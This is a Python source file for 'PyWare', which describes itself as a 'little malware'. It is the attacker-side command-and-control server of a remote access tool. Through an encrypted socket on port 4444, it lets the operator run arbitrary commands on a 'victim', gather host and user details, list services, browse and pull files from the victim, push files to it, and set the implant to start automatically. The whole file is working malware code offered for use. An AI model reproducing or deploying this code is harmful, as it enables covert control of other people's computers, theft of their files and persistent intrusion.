#!/usr/bin/python3
# -*-coding:Utf-8 -*-

import os
import sys
import base64
import socket
import argparse
import collections
import subprocess
try:
    import hello  # Personal module
except ModuleNotFoundError:
    pass

try:
    import crypto  # Personal module
    from Crypto.Hash import SHA256  # Module pycryptodome
except ModuleNotFoundError:
    print("[x] PyWare needs pycryptodome module.")
    if os.name == "posix":
        print(" Try \'pip install pycryptodome\' to install it")
    elif os.name == "nt":
        print(" Try \'python -m pip install pycryptodome\' to install it")
    sys.exit(1)


PORT = 4444           # Default value for the port
BUFFER_SIZE = 4096    # Buffer size for incoming messages. Must be a multiple of 8


def arguments():
    global PORT

    def verif_port(port):
        port = int(port)
        if not (1 <= port <= 65535):
            raise argparse.ArgumentTypeError("The port number must be between 1 and 65 included")
        return port

    parser = argparse.ArgumentParser(description="Little malware made with Python.")
    parser.add_argument("-p", "--port", help="port to listen to. Default : {}".format(PORT),
                        default=PORT, type=verif_port)
    args = parser.parse_args()
    PORT = args.port


class ConnectionServer:
    def __init__(self, port: int):
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.server_socket.bind(("", self.port))
        except OSError:
            print("[x] Port already in use")
            sys.exit(1)
        self.server_socket.listen(1)
        self.server_socket.settimeout(None)
        print("[-] Server start on", self.port)
        self.connection, self.address = self.server_socket.accept()
        print("[-] New connection from ", self.address[0])
        self.server_socket.settimeout(300.0)
        self.is_alive = True
        key, iv = self.keys_exchange()
        self.session_key = crypto.CryptoAES(key, iv)

    def keys_exchange(self):
        global CRYPTO_OK
        global BUFFER_SIZE
        try:
            print("[-] Creation of temporary RSA keys.")
            rsa_enc = crypto.CryptoRSA()
            print("[-] Send public key.")
            pub_key = rsa_enc.export_pub_key()
            pub_key_b64 = base64.b64encode(pub_key)
            self.connection.sendall(pub_key_b64)
            print("[-] Session key and iv acquisition and decryption.")
            key_iv_enc = self.connection.recv(BUFFER_SIZE)
            if key_iv_enc != base64.b64encode(b"Unvailable00"):
                key_iv = rsa_enc.decrypt(key_iv_enc)
                key = key_iv[:32]
                iv = key_iv[33:]
                print("[-] Secure connection established.")
                CRYPTO_OK = True
            else:
                print("[x] Client does not support encryption.\n    Base64 will be used.")
                key = None
                iv = None
                CRYPTO_OK = False
        except (ConnectionAbortedError, ConnectionResetError, socket.timeout):
            print("[x] Connection lost")
            self.end()
            key = None
            iv = None
        return key, iv

    def send_enc(self, data):
        global CRYPTO_OK
        global BUFFER_SIZE
        if type(data) == str:
            data = data.encode("utf-8", errors="replace")
        if CRYPTO_OK:
            data_enc = self.session_key.encrypt(data)
        else:
            data_enc = base64.b64encode(data)
        try:
            if len(data_enc) % BUFFER_SIZE == 0:
                data_enc += b" " * 5
            self.connection.sendall(data_enc)
        except (ConnectionAbortedError, ConnectionResetError):
            print("[x] Connection lost")
            self.is_alive = False

    def receive_enc(self):
        global CRYPTO_OK
        global BUFFER_SIZE
        try:
            data_enc = b""
            while len(data_enc) % BUFFER_SIZE == 0:
                data_enc += self.connection.recv(BUFFER_SIZE)
            if data_enc[-5:] == b" " * 5:
                data_enc = data_enc[:-5]
            if CRYPTO_OK:
                data = self.session_key.decrypt(data_enc)
            else:
                data = base64.b64decode(data_enc)
        except (ConnectionAbortedError, ConnectionResetError, socket.timeout):
            print("[x] Victim does not seem to responding")
            print("[-] connection is closed")
            data = b""
            self.is_alive = False
        return data

    def end(self):
        self.connection.shutdown(socket.SHUT_RDWR)
        self.connection.close()
        print("[-] Connection close")
        self.is_alive = False


class Commands:
    def __init__(self, connection: ConnectionServer):
        self.connection = connection
        command_tuple = collections.namedtuple("function", ["run", "option", "help"])
        self.commands_available = {"exit": command_tuple(lambda: self.exit(),
                                                         "exit",
                                                         "Close connection and exit this prompt."
                                                         " PyWare on client stay running for new connection."),
                                   "quit": command_tuple(lambda: self.exit(),
                                                         "quit",
                                                         "Alias for 'exit'."),
                                   "kill": command_tuple(lambda: self.kill(),
                                                         "kill",
                                                         "Close connection and exit this prompt."
                                                         " PyWare on client is kill."),
                                   "help": command_tuple(lambda arg="": self.help(arg),
                                                         "help [command]",
                                                         "Print this help."),
                                   "list": command_tuple(lambda: self.list(),
                                                         "list",
                                                         "List command available."),
                                   "getinfo": command_tuple(lambda arg="": self.getinfo(arg),
                                                            "getinfo [options,]",
                                                            "Get information from the victim. Options available : "
                                                            "user, hostname, fqdn, ip, os, version, architecture, "
                                                            "language, time"),
                                   "autostart": command_tuple(lambda arg="": self.autostart(arg),
                                                              "autostart [Name]",
                                                              "PyWare on client starts automatically."
                                                              " [Name] is the name used for the registration."),
                                   "newkeys": command_tuple(lambda: self.newkeys(),
                                                            "newkeys",
                                                            "Generate and use a new session key."),
                                   "exec": command_tuple(lambda arg="": self.exec(arg),
                                                         "exec command",
                                                         "Execute a command on the client and print result."
                                                         " Warning, it is an integrative mode."),
                                   "getusers": command_tuple(lambda: self.getusers(),
                                                             "getusers",
                                                             "List all users on the ditant system."),
                                   "installmodules": command_tuple(lambda: self.install_modules(),
                                                                   "installmodules",
                                                                   "Install the python modules for full compatibility."
                                                                   " A reload is needed after."),
                                   "reload": command_tuple(lambda: self.reload(),
                                                           "reload",
                                                           "Reload the client on the target."),
                                   "getservices": command_tuple(lambda: self.getservices(),
                                                                "getservicse",
                                                                "Get the list of the running services."),
                                   "ps": command_tuple(lambda: self.getservices(),
                                                       "ps",
                                                       "Alias for getservices"),
                                   "pwd": command_tuple(lambda: self.pwd(),
                                                        "pwd",
                                                        "Get the current working directory."),
                                   "cd": command_tuple(lambda arg="": self.cd(arg),
                                                       "cd Dir",
                                                       "Change the working directory to \'Dir\' ."),
                                   "ls": command_tuple(lambda arg="": self.ls(arg),
                                                       "ls [Dir]",
                                                       "List files and directory of \'Dir\' . If \'Dir\'"
                                                       " is not specify, list the current working directory."),
                                   "dir": command_tuple(lambda arg="": self.ls(arg),
                                                        "dir [Dir]",
                                                        "Alias for \'ls\'."),
                                   "/pwd": command_tuple(lambda: self.local_pwd(),
                                                         "/pwd",
                                                         "Get the current working directory on the local machine."),
                                   "/cd": command_tuple(lambda arg="": self.local_cd(arg),
                                                        "/cd Dir",
                                                        "Change the working directory to \'Dir\'"
                                                        " on the local machine."),
                                   "/ls": command_tuple(lambda arg="": self.local_ls(arg),
                                                        "/ls [Dir]",
                                                        "List files and directory of \'Dir\'  on the local machine."
                                                        " If \'Dir\' is not specify, list the current directory."),
                                   "/dir": command_tuple(lambda arg="": self.local_ls(arg),
                                                         "/dir [Dir]",
                                                         "Alias for \'/ls\'."),
                                   "download": command_tuple(lambda arg="": self.download(arg),
                                                             "download File",
                                                             "Download from the target to local computer."),
                                   "upload": command_tuple(lambda arg="": self.upload(arg),
                                                           "upload File",
                                                           "Upload file to the server")}

    def run(self):
        try:
            user_input = input("$> ").split()
            if len(user_input) != 0:       # Test empty user_input
                user_command = user_input[0].lower()
                user_arguments = " ".join(user_input[1:])
                try:
                    if user_arguments == "":
                        self.commands_available[user_command].run()
                    else:
                        self.commands_available[user_command].run(user_arguments)
                except TypeError:
                    print("[x] This command don't have arguments.\n  Type help for list available commands.")
                except KeyError:
                    print("[x] Command not found.\n  Type help for list available commands.")
        except (KeyboardInterrupt, EOFError):
            print("Ctrl^C or Ctrl^D : exit send")
            self.exit()

    def send_command(self, command):
        self.connection.send_enc(command)
        ret = self.connection.receive_enc()
        if type(ret) == bytes:
            ret = ret.decode("utf-8", errors="replace")
        print(ret)

    def exit(self):
        self.send_command("exit")
        self.connection.end()

    def kill(self):
        self.send_command("kill")
        self.connection.end()

    def help(self, commands=""):
        if commands == "":
            for command in sorted(self.commands_available.keys()):
                print("{:20} : {}".format(self.commands_available[command].option,
                                          self.commands_available[command].help))
        else:
            commands = commands.replace(",", " ")
            commands = commands.split()
            for command in sorted(commands):
                try:
                    print("{:20} : {}".format(self.commands_available[command].option,
                                              self.commands_available[command].help))
                except KeyError:
                    print("\'{}\' not available\n".format(command))

    def list(self):
        list_comm = ""
        for comm_name in sorted(self.commands_available.keys()):
            list_comm += comm_name + ", "
        print(list_comm[:-2])

    def getinfo(self, choice=""):
        self.send_command("getinfo " + choice)

    def newkeys(self):
        if CRYPTO_OK:
            self.connection.send_enc("newkeys")
            key, iv = self.connection.keys_exchange()
            self.connection.session_key = crypto.CryptoAES(key, iv)
            ret = self.connection.receive_enc().decode("utf-8", errors="replace")
        else:
            ret = "[x] Client does not support encryption.\n    Base64 will be used."
        print(ret)

    def exec(self, command=""):
        if command == "":
            print("You must enter a command")
        else:
            self.send_command("exec " + command)

    def getusers(self):
        self.send_command("getusers")

    def install_modules(self):
        self.send_command("installmodules ")
        data = self.connection.receive_enc()
        print(data.decode("utf-8", errors="replace"))
        print("Don't forget to reload.")

    def reload(self):  # TODO not working
        ret = input("Warning, connection will be lost during the reload. Are you sure you want to continue? [Y/n] : ")
        if ret.lower() == "y" or ret == "":
            self.connection.send_enc("reload")
            ret = self.connection.receive_enc()
            if type(ret) == bytes:
                ret = ret.decode("utf-8", errors="replace")
            print(ret)
            if ret == b"INFO SERVER : reloading":
                if sys.platform == "linux":
                    subprocess.run(["python3", __file__])
                elif sys.platform == "win3":
                    subprocess.run(["python", __file__])
                else:
                    print("Please, reload the server")
                self.connection.is_alive = False
        else:
            print("Reload cancelled")

    def getservices(self):
        self.send_command("getservices")

    def autostart(self, name=""):
        self.send_command("autostart " + name)

    def pwd(self):
        self.send_command("pwd")

    def cd(self, dir=""):
        if dir == "":
            print("You need to specify a directory")
        self.send_command("cd " + dir)

    def ls(self, dir=""):
        self.send_command("ls " + dir)

    @staticmethod
    def local_pwd():
        print(os.getcwd())

    @staticmethod
    def local_cd(dir: str):
        if not os.path.exists(dir):
            print("Directory {} not found".format(dir))
        elif not os.path.isdir(dir):
            print("{} is not a directory".format(dir))
        else:
            try:
                os.chdir(dir)
                print(os.getcwd())
            except FileNotFoundError:
                print("Unknown error")

    @staticmethod
    def local_ls(dir="."):
        if dir == "":
            dir = "."
        if not os.path.exists(dir):
            print("Directory \'{}\' not found".format(dir))
        elif not os.path.isdir(dir):
            print("{} is not a directory".format(dir))
        else:
            try:
                ret = os.listdir(dir)
                print("\n".join(ret))
            except FileNotFoundError:
                print("Unknown error")

    def upload(self, filename=""):
        global CRYPTO_OK
        if filename == "":
            print("[x] Please, specify a file")
        elif not os.path.exists(filename):
            print("[x] File {} not found".format(filename))
        elif not os.path.isfile(filename):
            self.connection.send_enc("[x] {} is not a file.".format(filename))
        else:
            try:
                file = open(filename, "rb")
                self.connection.send_enc("download " + filename)
                data_in = self.connection.receive_enc()
                if data_in == b"ok":
                    print("[-] Uploading start")
                    data = file.read()
                    self.connection.send_enc(data)
                data_in = self.connection.receive_enc()
                print(data_in.decode("utf-8", errors="replace"))
                if CRYPTO_OK:
                    file.seek(0)
                    hash_local = SHA256.new(data=file.read()).hexdigest()
                    print("local hash   :", hash_local)
                    hash_distant = self.connection.receive_enc().decode("utf-8")
                    print("distant hash :", hash_distant)
                    if hash_local == hash_distant:
                        print("Hashes match.")
                    else:
                        print("Hashes not match. An error may have occurred during the transfer.")
                else:
                    print("Unable to check the hash. Cryptography is disable on the target.")
                file.close()
            except PermissionError:
                self.connection.send_enc("[x] Permission denied. Please, verify the permissions of the file.")

    def download(self, filename=""):
        global CRYPTO_OK
        if filename == "":
            print("[x] Please, specify a file")
        elif os.path.exists(filename):
            print("[x] File {} already exist on local computer".format(filename))
        else:
            try:
                file = open(filename, "wb+")
                self.connection.send_enc("upload " + filename)
                data_in = self.connection.receive_enc()
                if data_in == b"ok":
                    print("[-] Downloading start . . .")
                    data_in = self.connection.receive_enc()
                    file.write(data_in)
                print("[-] Download finish. Checking the sha256 hash.")
                self.connection.send_enc(b"ack")
                if CRYPTO_OK:
                    file.seek(0)
                    hash_local = SHA256.new(data=file.read()).hexdigest()
                    print("local hash   :", hash_local)
                    hash_distant = self.connection.receive_enc().decode("utf-8")
                    print("distant hash :", hash_distant)
                    if hash_local == hash_distant:
                        print("Hashes match.")
                    else:
                        print("Hashes not match. An error may have occurred during the transfer.")
                else:
                    print("Unable to check the hash. Cryptography is disable on the target.")
                file.close()
            except PermissionError:
                print("[x] Unable to create file. Please, verify permissions")


def main():
    arguments()
    try:
        hello.hello()
    except NameError:
        print("*----------*\n"
              "|  PyWare  |\n"
              "*==========*\n")
    server_connection = ConnectionServer(PORT)
    user_commands = Commands(server_connection)
    while server_connection.is_alive:
        user_commands.run()


CRYPTO_OK = True
if __name__ == "__main__":
    main()


# TODO tester : install module & reload
